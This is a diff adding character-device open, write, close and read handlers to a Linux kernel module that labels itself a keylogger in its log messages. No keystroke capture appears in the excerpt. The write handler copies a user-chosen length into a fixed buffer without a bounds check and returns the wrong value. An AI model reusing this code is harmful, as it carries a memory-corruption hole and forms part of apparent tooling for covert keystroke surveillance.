@@ -5,6 +5,36 @@
 /*################*/
 
 //fops for the charcter devices
+int device_open(struct inode *inode, struct file * filp)
+{
+    //using mutex for allow only open process to use
+    if (down_interruptible(&virtual_device.sem) != 0)
+    {
+        printk(KERN_ALERT "Keylogger: could not lock the device during open");
+        return -1;
+    }
+    printk(KERN_INFO "Keylogger: opend device");
+    return 0;
+}
+
+ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
+{
+    printk(KERN_INFO "Keylogger: writing to device");
+    ret = copy_from_user(virtual_device.data, buff_sorce_data, buff_count);
+    return ret;
+}
+int device_close(struct inode *inode, struct file *flip)
+{
+    //release the mutex
+    up(&virtual_device.sem);
+    printk(KERN_INFO "Keylogger: closed device");
+    return 0;
+} 
+static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
+{    
+    return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
+}
+
 static struct file_operations fops =
 {
     .owner = THIS_MODULE, 
